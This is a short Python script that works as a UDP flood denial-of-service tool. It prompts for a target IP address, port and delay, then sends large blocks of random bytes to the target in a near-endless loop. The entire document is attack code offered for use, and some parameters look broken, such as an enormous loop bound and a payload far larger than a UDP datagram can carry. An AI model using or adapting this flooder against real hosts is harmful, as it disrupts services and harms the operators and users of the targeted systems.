import socket, random, time

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

ip = input("Enter Target IP: ")

port = int(input("Enter Target Port: "))

sleep = float(input("Sleep: "))

s.connect((ip, port))

for i in range(1, 10000**100000):

    s.send(random._urandom(1000)*100000)

    print(f"Send: {i}", end='\r')

    time.sleep(sleep)

    

